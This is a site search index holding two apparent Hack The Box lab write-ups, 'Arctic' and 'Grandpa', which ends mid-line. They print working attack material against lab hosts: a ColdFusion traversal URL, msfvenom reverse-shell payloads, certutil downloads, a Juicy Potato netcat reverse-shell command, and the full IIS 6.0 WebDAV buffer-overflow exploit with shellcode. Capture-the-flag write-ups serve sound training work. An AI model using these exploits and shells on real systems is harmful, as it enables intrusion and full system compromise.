var tipuesearch = {"pages":[{"url":"https://sittingducks.io/Arctic.html","text":"This is another HTB write-up where we will exploit an Adobe Coldfusion vulnerability to get initial foothold in the box. Once in the Windows 2008 box, the Juicy Potato exploit was used in order to get an administrative shell. Recon kali@kali:~/Documents/HTB/boxes/results/10.10.10.11/scans$ cat _full_tcp_nmap.txt # Nmap 7 .80 scan initiated Mon Sep 28 14 :28:40 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/Documents/HTB/boxes/results/10.10.10.11/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/HTB/boxes/results/10.10.10.11/scans/xml/_full_tcp_nmap.xml 10 .10.10.11 Nmap scan report for 10.10.10.11 Host is up, received user-set (0.094s latency). Scanned at 2020-09-28 14:28:40 BST for 723s Not shown: 65532 filtered ports Reason: 65532 no-responses PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack Microsoft Windows RPC 8500/tcp open fmtp? syn-ack 49154/tcp open msrpc syn-ack Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 28 14 :40:43 2020 -- 1 IP address ( 1 host up ) scanned in 723 .23 seconds the nmap output above shows we have 3 ports open. 135 and 49154 seems to be MSRPC ports. Nmap is unable to identify with certainty what port 8500 is so I do a quick search online and I find this link which shows the following potential services: Two of the entries refers to Adobe ColdFusion , that is a web development platform. So I checked the URL http://10.10.10.11:8500 where I found the CFIDE directory, under which I found the administrator directory. Navigating to that page shows the Adobe ColdFusion administration panel On doing some research I found a Directory Traversal vulnerability on exploitdb I don't run the exploit script, instead, I navigate to the URL suggested in the exploit: http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en and I get this page: Seems like a password hash was found, 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 . Before trying to crack the hash with tools like hashcat or john , I always give it a try with crackstation as it's usually faster: The password was available on crackstation database, and it is happyday . Initial Foothold Once logged in I start exploring the GUI and I am particularly interested on a functionality that would allow me to upload some code. In the end I found the \"Debugging & Logging > Add/Edit Scheduled Task\" section: This section enables admins of the console to generate scheduled tasks and call remote scripts. After some research I found that ColdFusion can run JSP code so I generate a JSP shell and I host it on a python http server: kali@kali:~/Documents/HTB/boxes/results/10.10.10.11/exploit$ msfvenom -p java/jsp_shell_reverse_tcp LHOST = 10 .10.14.9 LPORT = 443 -f raw -o shell.jsp Payload size: 1495 bytes Saved as: shell.jsp kali@kali:~/Documents/oscp/results/10.11.1.10/exploit$ sudo python -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Now, in the URL field I enter the URL which points to the python http server running on my Kali box: http://10.10.14.9/shell.jsp and in the File field I enter the ColdFusion default web root directory: C:\\ColdFusion8\\wwwroot\\CFIDE\\shell.sjp then I click on submit. Now I run the Scheduled task on-demand: I can see that the shell has been called, sign that the process is working: kali@kali:~/Documents/HTB/boxes/results/10.10.10.11/exploit$ sudo python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.11 - - [02/Oct/2020 16:58:11] \"GET /shell.jsp HTTP/1.1\" 200 - Now I will activate a netcat listener on port 443 and I navigate to the newly added shell by navigating to _http://10.10.10.11:8500/CFIDE/shell.jsp: I get my shell back and I can grab the user.txt file: kali@kali:~$ sudo rlwrap nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49474 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin>whoami whoami arctic\\tolis C:\\ColdFusion8\\runtime\\bin>type c:\\users\\tolis\\desktop\\user.txt type c:\\users\\tolis\\desktop\\user.txt 02****************************f3 Privilege Escalation The first thing I do before running any enumeration scripts, I check if the SeImpersonatePrivilege is enable because if it is then I know for sure I can run Juicy Potato and get an administrative shell. C:\\>whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeImpersonatePrivilege is enable, so let's use Juicy Potato. I also run systeminfo to know a bit more about the machine in question: C:\\>systeminfo systeminfo Host Name: ARCTIC OS Name: Microsoft Windows Server 2008 R2 Standard OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-507-9857321-84451 Original Install Date: 22/3/2017, 11:09:45 System Boot Time: 4/10/2020, 1:56:48 System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 1.023 MB Available Physical Memory: 240 MB Virtual Memory: Max Size: 2.047 MB Virtual Memory: Available: 1.190 MB Virtual Memory: In Use: 857 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.11 After downloaded the Juicy Potato project, I compiled it with Visual Studio on a Windows 10 box and I obtained an executable: Then I transfer the exe to my Kali box and I host it on a python http server so that I can download it on the victim machine using certutil . I also download netcat with the same procedure: C:\\Users\\tolis\\Desktop>certutil -urlcache -split -f http://10.10.14.9/JuicyPotato.exe jp.exe certutil -urlcache -split -f http://10.10.14.9/JuicyPotato.exe jp.exe **** Online **** 000000 ... 053000 CertUtil: -URLCache command completed successfully. C:\\Users\\tolis\\Desktop>certutil -urlcache -split -f http://10.10.14.9/nc64.exe nc.exe certutil -urlcache -split -f http://10.10.14.9/nc64.exe nc.exe **** Online **** 0000 ... b0d8 CertUtil: -URLCache command completed successfully. C:\\Users\\tolis\\Desktop>dir dir Volume in drive C has no label. Volume Serial Number is F88F-4EA5 Directory of C:\\Users\\tolis\\Desktop 04/10/2020 03:30 <DIR> . 04/10/2020 03:30 <DIR> .. 04/10/2020 03:29 339.968 jp.exe 04/10/2020 03:30 45.272 nc.exe 22/03/2017 10:01 32 user.txt 3 File(s) 385.272 bytes 2 Dir(s) 33.182.298.112 bytes free Once I have the two exe files on the victim box I can execute the exploit: c:\\Users\\tolis\\Desktop> ./jp.exe -l 1234 -t * -p nc.exe -a \"-e cmd.exe 10.10.14.9 4444\" -c \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\" ./jp.exe -l 1234 -t * -p nc.exe -a \"-e cmd.exe 10.10.14.9 4444\" -c \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\" c:\\Users\\tolis\\Desktop>jp.exe -l 1234 -t * -p nc.exe -a \"-e cmd.exe 10.10.14.9 4444\" -c \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\" jp.exe -l 1234 -t * -p nc.exe -a \"-e cmd.exe 10.10.14.9 4444\" -c \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\" Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 1234 .... [+] authresult 0 {03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK where \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\" was picked from here as expected I receive an administrative reverse shell and I am able to get the root flag: kali@kali:~$ sudo rlwrap nc -lnvp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49586 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system C:\\Windows\\system32>type c:\\users\\administrator\\desktop\\root.txt type c:\\users\\administrator\\desktop\\root.txt ce****************************90","tags":"blogging","loc":"https://sittingducks.io/Arctic.html","title":"Arctic"},{"url":"https://sittingducks.io/Grandpa.html","text":"Recon kali@kali:~$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10 .10.10.14 Nmap scan report for 10.10.10.14 Host is up, received user-set (0.090s latency). Scanned at 2020-09-28 14:17:38 BST for 256s Not shown: 65534 filtered ports Reason: 65534 no-responses PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Microsoft IIS httpd 6.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Date: Mon, 28 Sep 2020 13:26:10 GMT | WebDAV type: Unknown |_ Server Type: Microsoft-IIS/6.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 28 14 :21:54 2020 -- 1 IP address ( 1 host up ) scanned in 256 .26 seconds Seems like we are dealing with an IIS 6.0 server and WebDAV is enabled. Now, I'll run a deeper scan on port 80: kali@kali:~$ nmap -vv --reason -Pn -sV -p 80 \"--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)\" 10 .10.10.14 Nmap scan report for 10.10.10.14 Host is up, received user-set (0.079s latency). Scanned at 2020-09-28 14:18:00 BST for 303s PORT STATE SERVICE REASON VERSION [56/296] 80/tcp open http syn-ack Microsoft IIS httpd 6.0 |_http-chrono: Request times for /; avg: 246.14ms; min: 205.54ms; max: 259.71ms | http-comments-displayer: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.14 | | Path: http://10.10.10.14:80/ | Line number: 20 | Comment: | <!--Probable causes:<--> | | Path: http://10.10.10.14:80/ | Line number: 18 | Comment: |_ <!--Problem--> |_http-csrf: Couldn't find any CSRF vulnerabilities. |_http-date: Mon, 28 Sep 2020 13:22:28 GMT; +4m17s from local time. |_http-devframework: ASP.NET detected. Found related header. |_http-dombased-xss: Couldn't find any DOM based XSS. |_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis) | http-enum: | /postinfo.html: Frontpage file or folder | /_vti_bin/_vti_aut/author.dll: Frontpage file or folder | /_vti_bin/_vti_aut/author.exe: Frontpage file or folder | /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder | /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder | /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder | /_vti_bin/shtml.dll: Frontpage file or folder |_ /_vti_bin/shtml.exe: Frontpage file or folder |_http-errors: Couldn't find any error pages. |_http-feed: Couldn't find any feeds. |_http-fetch: Please enter the complete path of the directory to save data in. | http-frontpage-login: | VULNERABLE: | Frontpage extension anonymous login | State: VULNERABLE | Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise. | | References: |_ http://insecure.org/sploits/Microsoft.frontpage.insecurities.html | http-headers: | Content-Length: 1433 | Content-Type: text/html | Content-Location: http://10.10.10.14/iisstart.htm | Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT | Accept-Ranges: bytes | ETag: \"05b3daec0d9c21:2c3\" | Server: Microsoft-IIS/6.0 | MicrosoftOfficeWebServer: 5.0_Pub | X-Powered-By: ASP.NET | Date: Mon, 28 Sep 2020 13:22:27 GMT | Connection: close | |_ (Request type: HEAD) |_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path> |_http-jsonp-detection: Couldn't find any JSONP endpoints. |_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable |_http-malware-host: Host appears to be clean | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-mobileversion-checker: No mobile version detected. | http-php-version: Logo query returned unknown hash d36ef6356fa2aa546f1da2bb003c17b1 |_Credits query returned unknown hash d36ef6356fa2aa546f1da2bb003c17b1 |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Microsoft-IIS/6.0 | http-sitemap-generator: | Directory structure: | / | Other: 1; gif: 1 | Longest directory structure: | Depth: 0 | Dir: / | Total files found (by extension): |_ Other: 1; gif: 1 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-title: Under Construction | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 | http-vhosts: |_127 names had status 200 | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Date: Mon, 28 Sep 2020 13:22:24 GMT | WebDAV type: Unknown |_ Server Type: Microsoft-IIS/6.0 |_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis) |_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 28 14 :23:03 2020 -- 1 IP address ( 1 host up ) scanned in 303 .69 seconds From the above scans few things stood out: we have IIS 6.0 FrontPage is running on the web server and Frontpage extension anonymous login has been found vulnerable. ASP.NET detected WebDAV is enabled the default web page shows a page under construction: Since webdav is enabled and allows anonymous login we can run a test to check if we can upload any files: kali@kali:~$ davtest -url http://10.10.10.14 ******************************************************** Testing DAV connection OPEN SUCCEED: http://10.10.10.14 ******************************************************** NOTE Random string for this session: nwktgQcHGOD2vz5 ******************************************************** Creating directory MKCOL FAIL ******************************************************** Sending test files PUT shtml FAIL PUT jhtml FAIL PUT cfm FAIL PUT pl FAIL PUT cgi FAIL PUT asp FAIL PUT html FAIL PUT aspx FAIL PUT jsp FAIL PUT txt FAIL PUT php FAIL ******************************************************** /usr/bin/davtest Summary: We can't upload any files so let's use searchsploit to look for potential exploits: kali@kali:~/Documents/HTB/boxes/results/10.10.10.14/scans$ searchsploit iis 6 | grep -i webdav Microsoft IIS - WebDAV Write Access Code Execution (Metasploit) | windows/remote/16471.rb Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Rem | windows/remote/22365.pl Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Rem | windows/remote/22366.c Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Rem | windows/remote/22367.txt Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Rem | windows/remote/22368.txt Microsoft IIS 5.0 - WebDAV 'ntdll.dll' Path Overflow (MS03-007) (Me | windows/remote/16470.rb Microsoft IIS 5.0 - WebDAV Denial of Service | windows/dos/20664.pl Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Servi | windows/dos/22670.c Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure | windows/remote/26230.txt Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Ove | windows/remote/41738.py Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1) | windows/remote/8704.txt Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2) | windows/remote/8806.pl Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch) | windows/remote/8754.patch Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP) | windows/remote/8765.php From the above list the following seems interesting since it's a remote exploit and could give us remote code execution: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Ove | windows/remote/41738.py The exploit looks like this: ''' Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016. Additional Information: the ScStoragePathFromUrl function is called twice Vulnerability Type: Buffer overflow Vendor of Product: Microsoft Affected Product Code Base: Windows Server 2003 R2 Affected Component: ScStoragePathFromUrl Attack Type: Remote Impact Code execution: true Attack Vectors: crafted PROPFIND data Has vendor confirmed or acknowledged the vulnerability?:true Discoverer:Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China ''' #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail.com import socket sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( '127.0.0.1' , 80 )) pay = 'PROPFIND / HTTP/1.1 \\r\\n Host: localhost \\r\\n Content-Length: 0 \\r\\n ' pay += 'If: <http://localhost/aaaaaaa' pay += ' \\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac ' pay += '>' pay += ' (Not <locktoken:write1>) <http://localhost/bbbbbbb' pay += ' \\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81 ' shellcode = 'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA' pay += shellcode pay += '> \\r\\n\\r\\n ' print pay sock . send ( pay ) data = sock . recv ( 80960 ) print data sock . close First off we need to change the IP from 127.0.0.1 to our target IP, that is 10.10.10.14. Furthermore, as per the comments, if successful the exploit will open calc.exe . We then need to generate a new shellcode and replace it: kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.9 LPORT = 443 -e x86/shikata_ga_nai -f python -v shellcode [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of python file: 1965 bytes shellcode = b\"\" shellcode += 